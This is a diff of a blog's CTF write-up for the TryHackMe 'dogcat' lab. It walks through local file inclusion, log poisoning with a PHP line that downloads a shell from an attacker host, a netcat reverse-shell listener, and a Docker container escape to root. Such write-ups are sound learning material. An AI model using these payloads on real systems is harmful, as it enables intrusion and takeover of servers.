@@ -1,43 +1,50 @@
-
+<!DOCTYPE html>
+<html lang="en" class="dark-mode">
 <head>
 
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-
     <title>dogcat | THM write-up</title>
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=8ba882e352">
+    <style>
+        :root {
+            --button-bg-color: #ffffff;
+            --button-text-color: var(--color-darkgrey);
+        }
+    </style>
 
-    <link rel="icon" href="../favicon.png" type="image/png">
-    <link rel="canonical" href="index.html">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <link rel="amphtml" href="amp/index.html">
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=7717a9b749" />
+
+    <link rel="icon" href="../favicon.png" type="image/png" />
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
     
-    <meta property="og:site_name" content="fr33s0ul">
-    <meta property="og:type" content="article">
-    <meta property="og:title" content="dogcat | THM write-up">
-    <meta property="og:description" content="Hello everyone, Today's CTF is very special made by Jammy a user in Tryhackme. Trust me even if this box is rated medium difficulty, You'll need to think a lot and be very patient. I guarantee you if you try hard in this challenge you'll learn a lot about LFI">
-    <meta property="og:url" content="https://fr33s0ul.tech/dogcat-thm-write-up/">
-    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/dc.png">
-    <meta property="article:published_time" content="2020-04-19T10:33:05.000Z">
-    <meta property="article:modified_time" content="2020-11-21T15:24:44.000Z">
-    <meta property="article:tag" content="CTF">
+    <meta property="og:site_name" content="fr33s0ul" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="dogcat | THM write-up" />
+    <meta property="og:description" content="Hello everyone, Today&#x27;s CTF is very special made by Jammy a user in Tryhackme. Trust me even if this box is rated medium difficulty, You&#x27;ll need to think a lot and be very patient. I guarantee you if you try hard in this challenge you&#x27;ll learn a lot about LFI" />
+    <meta property="og:url" content="http://localhost:2368/dogcat-thm-write-up/" />
+    <meta property="og:image" content="http://localhost:2368/content/images/2020/04/dc.png" />
+    <meta property="article:published_time" content="2020-04-19T10:33:05.000Z" />
+    <meta property="article:modified_time" content="2022-03-24T15:36:25.000Z" />
+    <meta property="article:tag" content="CTF" />
     
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="dogcat | THM write-up">
-    <meta name="twitter:description" content="Hello everyone, Today's CTF is very special made by Jammy a user in Tryhackme. Trust me even if this box is rated medium difficulty, You'll need to think a lot and be very patient. I guarantee you if you try hard in this challenge you'll learn a lot about LFI">
-    <meta name="twitter:url" content="https://fr33s0ul.tech/dogcat-thm-write-up/">
-    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/dc.png">
-    <meta name="twitter:label1" content="Written by">
-    <meta name="twitter:data1" content="fr33s0ul">
-    <meta name="twitter:label2" content="Filed under">
-    <meta name="twitter:data2" content="CTF">
-    <meta name="twitter:site" content="@fr3350u1">
-    <meta name="twitter:creator" content="@fr33soul_">
-    <meta property="og:image:width" content="800">
-    <meta property="og:image:height" content="548">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="dogcat | THM write-up" />
+    <meta name="twitter:description" content="Hello everyone, Today&#x27;s CTF is very special made by Jammy a user in Tryhackme. Trust me even if this box is rated medium difficulty, You&#x27;ll need to think a lot and be very patient. I guarantee you if you try hard in this challenge you&#x27;ll learn a lot about LFI" />
+    <meta name="twitter:url" content="http://localhost:2368/dogcat-thm-write-up/" />
+    <meta name="twitter:image" content="http://localhost:2368/content/images/2020/04/dc.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="fr33s0ul" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="CTF" />
+    <meta name="twitter:site" content="@fr33s0ul_Ninja" />
+    <meta name="twitter:creator" content="@fr33s0ul_Ninja" />
+    <meta property="og:image:width" content="800" />
+    <meta property="og:image:height" content="548" />
     
     <script type="application/ld+json">
 {
@@ -46,10 +53,10 @@
     "publisher": {
         "@type": "Organization",
         "name": "fr33s0ul",
-        "url": "https://fr33s0ul.tech/",
+        "url": "http://localhost:2368/",
         "logo": {
             "@type": "ImageObject",
-            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/logo.gif",
+            "url": "http://localhost:2368/content/images/2020/03/logo.gif",
             "width": 300,
             "height": 41
         }
@@ -59,22 +66,22 @@
         "name": "fr33s0ul",
         "image": {
             "@type": "ImageObject",
-            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/asdasd.gif",
+            "url": "http://localhost:2368/content/images/2020/03/asdasd.gif",
             "width": 600,
             "height": 594
         },
-        "url": "https://fr33s0ul.tech/author/fr33s0ul/",
+        "url": "http://localhost:2368/author/fr33s0ul/",
         "sameAs": [
-            "https://twitter.com/fr33soul_"
+            "https://twitter.com/fr33s0ul_Ninja"
         ]
     },
     "headline": "dogcat | THM write-up",
-    "url": "https://fr33s0ul.tech/dogcat-thm-write-up/",
+    "url": "http://localhost:2368/dogcat-thm-write-up/",
     "datePublished": "2020-04-19T10:33:05.000Z",
-    "dateModified": "2020-11-21T15:24:44.000Z",
+    "dateModified": "2022-03-24T15:36:25.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/04/dc.png",
+        "url": "http://localhost:2368/content/images/2020/04/dc.png",
         "width": 800,
         "height": 548
     },
@@ -82,13 +89,16 @@
     "description": "Hello everyone, Today&#x27;s CTF is very special made by Jammy\n[https://tryhackme.com/p/jammy] a user in Tryhackme. Trust me even if this box\nis rated medium difficulty, You&#x27;ll need to think a lot and be very patient. I\nguarantee you if you try hard in this challenge you&#x27;ll learn a lot about LFI\n(local-file-inclusion), log poising, and containers escaping.\n\n&gt; Enumeration\nroot@kali:~# nmap -sC -sV 10.10.132.16\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-04-18 09:56 UTC\nNmap scan report for ip-10-1",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://fr33s0ul.tech/"
+        "@id": "http://localhost:2368/"
     }
 }
     </script>
 
-    <meta name="generator" content="Ghost 3.38">
-    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../rss/index.html">
+    <meta name="generator" content="Ghost 4.41" />
+    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../rss/index.html" />
+    
+    <script defer src="../public/cards.min.js?v=7717a9b749"></script>
+    <link rel="stylesheet" type="text/css" href="../public/cards.min.css?v=7717a9b749">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-111725042-2"></script>
 <script>
@@ -98,113 +108,100 @@
 
   gtag('config', 'UA-111725042-2');
 </script>
+<!-- Go to www.addthis.com/dashboard to customize your tools -->
+<script type="text/javascript" src="http://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5fc3b35649b48a82"></script>
+
+<style>:root {--ghost-accent-color: #15171A;}</style>
 
 </head>
 <body class="post-template tag-ctf">
+<div class="viewport">
 
-    <div class="site-wrapper">
+    <header id="gh-head" class="gh-head has-cover">
+        <nav class="gh-head-inner inner gh-container">
 
-        
-
-<header class="site-header">
-    <div class="outer site-nav-main">
-    <div class="inner">
-        <nav class="site-nav">
-    <div class="site-nav-left-wrapper">
-        <div class="site-nav-left">
-                <a class="site-nav-logo" href="../"><img src="../content/images/size/w1000/2020/03/logo.gif" alt="fr33s0ul"></a>
-            <div class="site-nav-content">
-                    <ul class="nav">
-    <li class="nav-home"><a href="../">Home</a></li>
-    <li class="nav-whoami"><a href="../whoami/">whoami</a></li>
-    <li class="nav-whispers"><a href="../whispers/">Whispers</a></li>
-    <li class="nav-ai"><a href="../tag/ai/">Ai</a></li>
-    <li class="nav-ctf"><a href="../tag/ctf/">CTF</a></li>
+            <div class="gh-head-brand">
+                <a class="gh-head-logo" href="../index.html">
+                        <img src="../content/images/size/w600/2020/03/logo.gif" alt="fr33s0ul" />
+                </a>
+                <a class="gh-burger" role="button">
+                    <div class="gh-burger-box">
+                        <div class="gh-burger-inner"></div>
+                    </div>
+                </a>
+            </div>
+            <div class="gh-head-menu">
+                <ul class="nav">
+    <li class="nav-home"><a href="../index.html">Home</a></li>
+    <li class="nav-whoami"><a href="../whoami/index.html">whoami</a></li>
+    <li class="nav-whispers"><a href="../whispers/index.html">Whispers</a></li>
+    <li class="nav-ai"><a href="../tag/ai/index.html">Ai</a></li>
+    <li class="nav-ctf"><a href="../tag/ctf/index.html">CTF</a></li>
 </ul>
 
-                    <span class="nav-post-title ">dogcat | THM write-up</span>
             </div>
-        </div>
-    </div>
-    <div class="site-nav-right">
-            <div class="social-links">
-                    <a class="social-link social-link-tw" href="https://twitter.com/fr3350u1" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
+            <div class="gh-head-actions">
+                <div class="gh-social">
+                        <a class="gh-social-twitter" href="https://twitter.com/fr33s0ul_Ninja" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
 </a>
-            </div>
-                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://fr33s0ul.tech/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
-</a>
-
-    </div>
-</nav>
-    </div>
-</div></header>
-
-
-<main id="site-main" class="site-main outer">
-    <div class="inner">
-
-        <article class="post-full post tag-ctf ">
-
-            <header class="post-full-header">
-
-                <section class="post-full-tags">
-                    <a href="../tag/ctf/">CTF</a>
-                </section>
-
-                <h1 class="post-full-title">dogcat | THM write-up</h1>
-
-
-                <div class="post-full-byline">
-
-                    <section class="post-full-byline-content">
-
-                        <ul class="author-list">
-                            <li class="author-list-item">
-
-                                <div class="author-card">
-                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
-                                    <div class="author-info">
-                                        <div class="bio">
-                                            <h2>fr33s0ul</h2>
-                                            <p>A humble person interested to technology since first 3 way handshake, Having one goal from all of this, Sharing knowledge for the sake of change to a better humanity.</p>
-                                            <p><a href="../author/fr33s0ul/">More posts</a> by fr33s0ul.</p>
-                                        </div>
-                                    </div>
-                                </div>
-
-                                <a href="../author/fr33s0ul/" class="author-avatar">
-                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
-                                </a>
-
-                            </li>
-                        </ul>
-
-                        <section class="post-full-byline-meta">
-                            <h4 class="author-name"><a href="../author/fr33s0ul/">fr33s0ul</a></h4>
-                            <div class="byline-meta-content">
-                                <time class="byline-meta-date" datetime="2020-04-19">19 Apr 2020</time>
-                                <span class="byline-reading-time"><span class="bull">•</span> 6 min read</span>
-                            </div>
-                        </section>
-
-                    </section>
-
-
                 </div>
-            </header>
 
-            <figure class="post-full-image">
-                <img srcset="../content/images/size/w300/2020/04/dc.png 300w,
+                    <a class="gh-head-button" href="index.html#/portal/signup" data-portal="signup">Subscribe</a>
+            </div>
+        </nav>
+    </header>
+
+    <div class="site-content">
+        
+
+
+
+<main id="site-main" class="site-main">
+    <article class="article post tag-ctf image-small">
+
+        <header class="article-header gh-canvas">
+
+            <section class="article-tag">
+                <a href="../tag/ctf/index.html">CTF</a>
+            </section>
+
+            <h1 class="article-title">dogcat | THM write-up</h1>
+
+
+            <div class="article-byline">
+                <section class="article-byline-content">
+                    <ul class="author-list">
+                        <li class="author-list-item">
+                            <a href="../author/fr33s0ul/index.html" class="author-avatar">
+                                <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" />
+                            </a>
+                        </li>
+                    </ul>
+                    <div class="article-byline-meta">
+                        <h4 class="author-name"><a href="../author/fr33s0ul/index.html">fr33s0ul</a></h4>
+                        <div class="byline-meta-content">
+                            <time class="byline-meta-date" datetime="2020-04-19">Apr 19, 2020</time>
+                            <span class="byline-reading-time"><span class="bull">&bull;</span> 6 min read</span>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <figure class="article-image">
+                <img
+                    srcset="../content/images/size/w300/2020/04/dc.png 300w,
                            ../content/images/size/w600/2020/04/dc.png 600w,
                           ../content/images/size/w1000/2020/04/dc. png 1000w,
-                         ../content/images/size/w2000/2020/04/dc. png 2000w" sizes="(max-width: 800px) 400px,
-                        (max-width: 1170px) 1170px,
-                            2000px" src="../content/images/size/w2000/2020/04/dc.png" alt="dogcat | THM write-up">
+                         ../content/images/size/w2000/2020/04/dc. png 2000w"
+                    sizes="(min-width: 1400px) 1400px, 92vw"
+                    src="../content/images/size/w2000/2020/04/dc.png"
+                    alt="dogcat | THM write-up"
+                />
             </figure>
+        </header>
 
-            <section class="post-full-content">
-                <div class="post-content">
-                    <p>Hello everyone, Today's CTF is very special made by <strong><a href="https://tryhackme.com/p/jammy">Jammy</a></strong> a user in <strong>Tryhackme</strong>. Trust me even if this box is rated medium difficulty, You'll need to think a lot and be very patient. I guarantee you if you try hard in this challenge you'll learn a lot about LFI (local-file-inclusion), log poising, and containers escaping.</p><blockquote>Enumeration</blockquote><figure class="kg-card kg-code-card"><pre><code>root@kali:~# nmap -sC -sV 10.10.132.16
+        <section class="gh-content gh-canvas">
+            <p>Hello everyone, Today's CTF is very special made by <strong><a href="https://tryhackme.com/p/jammy">Jammy</a></strong> a user in <strong>Tryhackme</strong>. Trust me even if this box is rated medium difficulty, You'll need to think a lot and be very patient. I guarantee you if you try hard in this challenge you'll learn a lot about LFI (local-file-inclusion), log poising, and containers escaping.</p><blockquote>Enumeration</blockquote><figure class="kg-card kg-code-card"><pre><code>root@kali:~# nmap -sC -sV 10.10.132.16
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-18 09:56 UTC
 Nmap scan report for ip-10-10-132-16.eu-west-1.compute.internal (10.10.132.16)
 Host is up (0.00091s latency).
@@ -240,13 +237,13 @@ Target: http://10.10.132.16/
 [10:03:00] 301 -  311B  - /dogs  -&gt;  http://10.10.132.16/dogs/
 [10:05:19] 403 -  277B  - /server-status                                    
                                                                                 
-Task Completed</code></pre><figcaption>ran some directory enum, nothing special just 10 dog pictures in <strong>dogs/</strong> and 10 cat pictures <strong>cats/</strong> folders</figcaption></figure><p>visiting the frontend we can see those pictures from the folders being called randomly every time you click cat or dog.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-18-at-10.58.32.png" class="kg-image" alt></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-18-at-10.58.44.png" class="kg-image" alt></figure><p>we can see that ?view= is taking care of calling the php files to execute the function that will show us at the end the doggies or kitties, what if we like dogs and cats. Nope!, doesn't like it and we get nothing. well technically not nothing, we get an error that tells us that it fails d to open the file because it doesn't exist. anything we add to view it adds to it .php at the end and if it does exist in the folder <strong>/var/www/html/</strong> it will call it if not, it will show the error again.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-18-at-11.34.09.png" class="kg-image" alt></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-19-at-08.50.52.png" class="kg-image" alt></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2020/04/Screenshot-2020-04-19-at-08.51.13.png" class="kg-image" alt><figcaption>and we have access to <strong>/etc/passwd</strong> we can see the users we have</figcaption></figure><p>the next thing we can do some log poisoning, If you are not familiar with log poisoning, I suggest visiting this link and read the article before moving forward.</p><figure class="kg-card kg-embed-card"><blockquote class="wp-embedded-content"><a href="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/">Apache Log Poisoning through LFI</a></blockquote>
-<script type="text/javascript">
+Task Completed</code></pre><figcaption>ran some directory enum, nothing special just 10 dog pictures in <strong>dogs/</strong> and 10 cat pictures <strong>cats/</strong> folders</figcaption></figure><p>visiting the frontend we can see those pictures from the folders being called randomly every time you click cat or dog.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-18-at-10.58.32.png" class="kg-image" alt loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-18-at-10.58.44.png" class="kg-image" alt loading="lazy"></figure><p>we can see that ?view= is taking care of calling the php files to execute the function that will show us at the end the doggies or kitties, what if we like dogs and cats. Nope!, doesn't like it and we get nothing. well technically not nothing, we get an error that tells us that it fails d to open the file because it doesn't exist. anything we add to view it adds to it .php at the end and if it does exist in the folder <strong>/var/www/html/</strong> it will call it if not, it will show the error again.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-18-at-11.34.09.png" class="kg-image" alt loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-19-at-08.50.52.png" class="kg-image" alt loading="lazy"></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2020/04/Screenshot-2020-04-19-at-08.51.13.png" class="kg-image" alt loading="lazy"><figcaption>and we have access to <strong>/etc/passwd</strong> we can see the users we have</figcaption></figure><p>the next thing we can do some log poisoning, If you are not familiar with log poisoning, I suggest visiting this link and read the article before moving forward.</p><figure class="kg-card kg-embed-card"><blockquote class="wp-embedded-content"><a href="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/">Apache Log Poisoning through LFI</a></blockquote>
+<script type='text/javascript'>
 <!--//--><![CDATA[//><!--
 		/*! This file is auto-generated */
 		!function(d,l){"use strict";var e=!1,o=!1;if(l.querySelector)if(d.addEventListener)e=!0;if(d.wp=d.wp||{},!d.wp.receiveEmbedMessage)if(d.wp.receiveEmbedMessage=function(e){var t=e.data;if(t)if(t.secret||t.message||t.value)if(!/[^a-zA-Z0-9]/.test(t.secret)){var r,a,i,s,n,o=l.querySelectorAll('iframe[data-secret="'+t.secret+'"]'),c=l.querySelectorAll('blockquote[data-secret="'+t.secret+'"]');for(r=0;r<c.length;r++)c[r].style.display="none";for(r=0;r<o.length;r++)if(a=o[r],e.source===a.contentWindow){if(a.removeAttribute("style"),"height"===t.message){if(1e3<(i=parseInt(t.value,10)))i=1e3;else if(~~i<200)i=200;a.height=i}if("link"===t.message)if(s=l.createElement("a"),n=l.createElement("a"),s.href=a.getAttribute("src"),n.href=t.value,n.host===s.host)if(l.activeElement===a)d.top.location.href=t.value}}},e)d.addEventListener("message",d.wp.receiveEmbedMessage,!1),l.addEventListener("DOMContentLoaded",t,!1),d.addEventListener("load",t,!1);function t(){if(!o){o=!0;var e,t,r,a,i=-1!==navigator.appVersion.indexOf("MSIE 10"),s=!!navigator.userAgent.match(/Trident.*rv:11\./),n=l.querySelectorAll("iframe.wp-embedded-content");for(t=0;t<n.length;t++){if(!(r=n[t]).getAttribute("data-secret"))a=Math.random().toString(36).substr(2,10),r.src+="#?secret="+a,r.setAttribute("data-secret",a);if(i||s)(e=r.cloneNode(!0)).removeAttribute("security"),r.parentNode.replaceChild(e,r)}}}}(window,document);
 //--><!]]>
-</script><iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/embed/" width="600" height="338" title="“Apache Log Poisoning through LFI” — Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2020/04/Screenshot-2020-04-19-at-09.44.22.png" class="kg-image" alt><figcaption>&lt;?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php'))?&gt;</figcaption></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-19-at-09.44.48.png" class="kg-image" alt></figure><pre><code>root@kali:~/php-reverse-shell-1.0# python -m SimpleHTTPServer 8083
+</script><iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/embed/" width="600" height="338" title="&#8220;Apache Log Poisoning through LFI&#8221; &#8212; Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2020/04/Screenshot-2020-04-19-at-09.44.22.png" class="kg-image" alt loading="lazy"><figcaption>&lt;?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php'))?&gt;</figcaption></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-19-at-09.44.48.png" class="kg-image" alt loading="lazy"></figure><pre><code>root@kali:~/php-reverse-shell-1.0# python -m SimpleHTTPServer 8083
 Serving HTTP on 0.0.0.0 port 8083 ...
 10.10.67.111 - - [19/Apr/2020 08:43:17] "GET /rev.php HTTP/1.0" 200 -
 </code></pre><figure class="kg-card kg-code-card"><pre><code>root@kali:~# nc -lvnp 1337
@@ -275,7 +272,7 @@ hostname
 4457cb6e9a51
 
 
-</code></pre><figcaption>enumerating more our user figured out that we are in a docker container.</figcaption></figure><blockquote>Escaping the container</blockquote><p>I will leave an article that can give you an idea about containers escaping and how it can be very useful in a lot of cases for pentester.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.bleepingcomputer.com/news/security/escaping-containers-to-execute-commands-on-play-with-docker-servers/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Escaping Containers to Execute Commands on Play with Docker Servers</div><div class="kg-bookmark-description">Improperly secured privileged containers on the Play with Docker testing platform offered security researchers a way to escape Linux containers and run arbitrary code on the host system.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://www.bleepstatic.com/favicon/bleeping.ico"><span class="kg-bookmark-author">Ionut Ilascu</span><span class="kg-bookmark-publisher">BleepingComputer.com</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://www.bleepstatic.com/content/posts/2019/01/14/PleywithDocker_logo.png"></div></a></figure><figure class="kg-card kg-code-card"><pre><code>cd /opt
+</code></pre><figcaption>enumerating more our user figured out that we are in a docker container.</figcaption></figure><blockquote>Escaping the container</blockquote><p>I will leave an article that can give you an idea about containers escaping and how it can be very useful in a lot of cases for pentester.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.bleepingcomputer.com/news/security/escaping-containers-to-execute-commands-on-play-with-docker-servers/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Escaping Containers to Execute Commands on Play with Docker Servers</div><div class="kg-bookmark-description">Improperly secured privileged containers on the Play with Docker testing platform offered security researchers a way to escape Linux containers and run arbitrary code on the host system.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://www.bleepstatic.com/favicon/bleeping.ico" alt=""><span class="kg-bookmark-author">BleepingComputer.com</span><span class="kg-bookmark-publisher">Ionut Ilascu</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://www.bleepstatic.com/content/posts/2019/01/14/PleywithDocker_logo.png" alt=""></div></a></figure><figure class="kg-card kg-code-card"><pre><code>cd /opt
 ls
 backups
 cd backups
@@ -305,254 +302,199 @@ root@dogcat:~# ls
 ls
 container
 flag4.txt
-root@dogcat:~#</code></pre><p>And we are root user at the host dogcat. Honestly, I learned a lot from this challenge I hope you found this write-up useful, feel free to leave a comment.</p><p>Happy Hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/room/dogcat"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | dogcat</div><div class="kg-bookmark-description">I made a website where you can look at pictures of dogs and/or cats!</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png"><span class="kg-bookmark-publisher">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/ec494890e8b7572b239164245663de13.png"></div></a></figure><!--kg-card-begin: html--><a href="https://www.patreon.com/bePatron?u=45903047" data-patreon-widget-type="become-patron-button">You can support my content, and help me do more and more by becoming a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script><!--kg-card-end: html-->
-                </div>
-            </section>
+root@dogcat:~#</code></pre><p>And we are root user at the host dogcat. Honestly, I learned a lot from this challenge I hope you found this write-up useful, feel free to leave a comment.</p><p>Happy Hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/room/dogcat"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | dogcat</div><div class="kg-bookmark-description">I made a website where you can look at pictures of dogs and/or cats!</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt=""><span class="kg-bookmark-author">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/ec494890e8b7572b239164245663de13.png" alt=""></div></a></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2022/03/crypto-coins-3.png" class="kg-image" alt loading="lazy" width="250" height="79"><figcaption>Crypto donations are appreciated for more free content and exciting topics <strong>0x684c21519d43E415506c1750c08FA0A97621FFEF</strong></figcaption></figure>
+        </section>
 
 
-            
-            <script>talkyardServerUrl='https://comments-for-fr33s0ul-tech.talkyard.net';</script>
-<script async defer src="https://c1.ty-cdn.net/-/talkyard-comments.min.js"></script>
-<div class="talkyard-comments" data-discussion-id="5e9ace85da86f68ecc6f0649" style="margin-top: 45px;">
-<noscript>Please enable Javascript to view comments.</noscript>
-</div>
-            
-
-        </article>
-
-    </div>
+    </article>
 </main>
 
-<aside class="read-next outer">
-    <div class="inner">
-        <div class="read-next-feed">
-                <article class="read-next-card">
-                    <header class="read-next-card-header">
-                        <h3><span>More in</span> <a href="../tag/ctf/">CTF</a></h3>
-                    </header>
-                    <div class="read-next-card-content">
-                        <ul>
-                            <li>
-                                <h4><a href="../yearoftherabbit-ctf-write-up/">YearOfTheRabbit | CTF write-up</a></h4>
-                                <div class="read-next-card-meta">
-                                    <p><time datetime="2020-04-22">22 Apr 2020</time> –
-                                        9 min read</p>
-                                </div>
-                            </li>
-                            <li>
-                                <h4><a href="../lfi/">Local file inclusion | write-up</a></h4>
-                                <div class="read-next-card-meta">
-                                    <p><time datetime="2020-04-17">17 Apr 2020</time> –
-                                        6 min read</p>
-                                </div>
-                            </li>
-                            <li>
-                                <h4><a href="../attacktive-directory-thm-write-up/">Attacktive Directory | THM write-up</a></h4>
-                                <div class="read-next-card-meta">
-                                    <p><time datetime="2020-04-17">17 Apr 2020</time> –
-                                        23 min read</p>
-                                </div>
-                            </li>
-                        </ul>
-                    </div>
-                    <footer class="read-next-card-footer">
-                        <a href="../tag/ctf/">See all 15 posts
-                            →</a>
-                    </footer>
-                </article>
 
-                <article class="post-card post tag-ctf ">
-
-    <a class="post-card-image-link" href="../yearoftherabbit-ctf-write-up/">
